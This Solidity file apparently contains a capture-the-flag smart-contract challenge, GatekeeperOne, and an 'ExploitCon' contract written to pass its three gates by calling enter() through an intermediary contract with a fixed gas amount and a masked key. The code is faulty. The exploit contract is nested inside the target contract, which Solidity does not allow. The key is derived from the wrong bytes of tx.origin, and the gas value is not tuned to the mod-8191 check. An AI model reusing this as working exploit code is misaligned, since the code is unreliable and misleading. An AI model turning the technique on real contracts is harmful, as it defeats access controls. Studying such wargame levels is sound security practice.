// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }

  contract ExploitCon {
    GatekeeperOne gko;
    bytes8 public calcNum;

    event Validated(uint32, uint16);

    constructor(address _gatekeepCon) public {
      gko = GatekeeperOne(_gatekeepCon);
    }
    
    function exploit(bytes8 key) public returns (bool complete) {
      (bool success,) = address(gko).call{gas: 99999}(abi.encodeWithSignature("enter(bytes8)", key));
      return success;
    }
    
    function calculate() public {
      calcNum = bytes8(bytes20(tx.origin)) & 0xFFFFFFFF0000FFFF;
      exploit(calcNum);
    }
    
    receive() external payable {
        calculate();
    }
  }
}